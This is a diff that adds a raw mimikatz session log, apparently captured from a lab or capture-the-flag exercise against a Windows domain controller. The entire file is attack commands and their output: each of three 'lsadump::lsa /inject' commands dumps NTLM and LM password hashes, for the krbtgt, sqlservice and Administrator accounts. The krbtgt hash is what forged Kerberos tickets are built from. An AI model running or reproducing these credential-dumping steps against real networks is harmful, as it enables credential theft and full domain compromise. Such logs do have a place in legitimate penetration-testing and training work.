@@ -1,0 +1,40 @@
+
+mimikatz # lsadump::lsa /inject /name:krbtgt
+Domain : CONTROLLER / S-1-5-21-432953485-3795405108-1502158860
+
+RID  : 000001f6 (502)
+User : krbtgt
+
+ * Primary
+    NTLM : 72cd714611b64cd4d5550cd2759db3f6
+    LM   :
+  Hash NTLM: 72cd714611b64cd4d5550cd2759db3f6
+    ntlm- 0: 72cd714611b64cd4d5550cd2759db3f6
+    lm  - 0: aec7e106ddd23b3928f7b530f60df4b6
+[..snip..]
+
+mimikatz # lsadump::lsa /inject /name:sqlservice
+Domain : CONTROLLER / S-1-5-21-432953485-3795405108-1502158860
+
+RID  : 00000455 (1109)
+User : sqlservice
+
+ * Primary
+    NTLM : cd40c9ed96265531b21fc5b1dafcfb0a
+    LM   :
+  Hash NTLM: cd40c9ed96265531b21fc5b1dafcfb0a
+    ntlm- 0: cd40c9ed96265531b21fc5b1dafcfb0a
+    lm  - 0: 7bb53f77cde2f49c17190f7a071bd3a0
+[..snip..]
+
+mimikatz # lsadump::lsa /inject /name:Administrator
+Domain : CONTROLLER / S-1-5-21-432953485-3795405108-1502158860
+
+RID  : 000001f4 (500)
+User : Administrator
+
+ * Primary
+    NTLM : 2777b7fec870e04dda00cd7260f7bee6
+    LM   :
+  Hash NTLM: 2777b7fec870e04dda00cd7260f7bee6
+[..snip..]
